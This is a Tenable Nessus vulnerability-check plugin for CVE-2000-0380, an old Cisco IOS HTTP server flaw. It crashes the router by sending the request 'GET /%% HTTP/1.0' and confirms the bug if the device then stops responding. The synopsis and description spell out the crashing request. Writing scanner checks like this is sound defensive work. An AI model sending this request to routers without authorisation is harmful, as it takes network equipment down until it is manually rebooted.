#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
 script_id(10387);
 script_version ("$Revision: 1.24 $");

 script_cve_id("CVE-2000-0380");
 script_bugtraq_id(1154);
 script_xref(name:"OSVDB", value:"1302");

 script_name(english:"Cisco IOS HTTP Service GET Request Remote DoS");
 script_summary(english:"Crashes a Cisco router");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote router has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be a Cisco router.  It was possible to\n",
     "lock this device by sending the following request :\n\n",
     "  GET /%% HTTP/1.0\n\n",
     "You need to reboot it to make it work again.\n\n",
     "A remote attacker may use this flaw to disrupt the network."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-04/0246.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.cisco.com/warp/public/707/cisco-sa-20000514-ios-http-server.shtml"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "Upgrade to the latest version of IOS, or disable the web server by\n",
     "issuing the following command on the router:\n\n",
     "  no ip http server"
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"CISCO");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_require_ports("Services/www", 80);
 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);
if (http_is_dead(port:port)) exit(0);

r = http_send_recv3(port: port, method: "GET", item: "/%%");
if (http_is_dead(port: port, retry: 3)) security_hole(port);

